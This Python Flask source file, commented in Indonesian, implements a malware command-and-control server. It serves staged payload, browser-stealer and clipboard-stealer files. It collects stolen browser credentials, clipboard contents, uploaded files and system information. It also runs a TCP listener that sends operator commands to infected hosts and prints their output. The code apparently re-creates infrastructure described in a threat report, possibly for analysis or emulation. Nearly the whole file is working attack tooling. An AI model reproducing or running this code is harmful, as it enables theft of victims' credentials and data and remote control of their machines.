from flask import Flask, send_file, request
import socket
import threading
import os

app = Flask(__name__)

# Direktori untuk menyimpan unggahan
UPLOAD_DIR = "uploads"
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)


# Endpoint untuk mengirim payload Main99
@app.route('/payload/99/73')
def serve_payload_99():
    return send_file("pay99_73.py")


@app.route('/brow/99/73')
def serve_brow_99():
    return send_file("brow99_73.py")


@app.route('/mclip/99/73')
def serve_mclip_99():
    return send_file("mclip15_99.py")


# Endpoint untuk mengirim payload Main5346
@app.route('/payload/5346/224')
def serve_payload_5346():
    return send_file("pay5346_224.py")


@app.route('/brow/5346/224')
def serve_brow_5346():
    return send_file("brow5346_224.py")


@app.route('/mclip/5346/224')
def serve_mclip_5346():
    return send_file("mclip5346_224.py")


# Endpoint untuk menerima unggahan file
@app.route('/uploads', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(os.path.join(UPLOAD_DIR, file.filename))
    return "OK", 200


# Endpoint untuk menerima informasi sistem (keys)
@app.route('/keys', methods=['POST'])
def keys():
    print(request.json)  # Cetak data JSON yang diterima
    return "OK", 200


# Endpoint untuk menerima kredensial browser dari Brow
@app.route('/brow_upload', methods=['POST'])
def brow_upload():
    with open("credentials.txt", "a") as f:
        f.write(request.data.decode('utf-8') + "\n")
    return "OK", 200


# Endpoint untuk menerima data clipboard dari MCLIP
@app.route('/clipboard_upload', methods=['POST'])
def clipboard_upload():
    with open("clipboard_log.txt", "a") as f:
        f.write(request.data.decode('utf-8') + "\n")
    return "OK", 200


# Fungsi untuk menjalankan server TCP untuk perintah
def tcp_command_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 2242))  # Gunakan port 2242 seperti dalam laporan
    s.listen(1)
    print("[+] Server TCP berjalan di port 2242")

    while True:
        conn, addr = s.accept()
        print(f"[+] Koneksi dari {addr}")
        try:
            while True:
                cmd = input("Command: ")
                conn.send(cmd.encode('utf-8'))
                response = conn.recv(4096).decode('utf-8')
                print(f"[*] Respons: {response}")
        except Exception as e:
            print(f"[-] Error dengan {addr}: {e}")
        finally:
            conn.close()


# Fungsi utama untuk menjalankan Flask dan TCP bersamaan
def run_servers():
    # Jalankan server TCP di thread terpisah
    tcp_thread = threading.Thread(target=tcp_command_server)
    tcp_thread.daemon = True
    tcp_thread.start()

    # Jalankan server Flask
    app.run(host="0.0.0.0", port=1224, threaded=True)


if __name__ == "__main__":
    run_servers()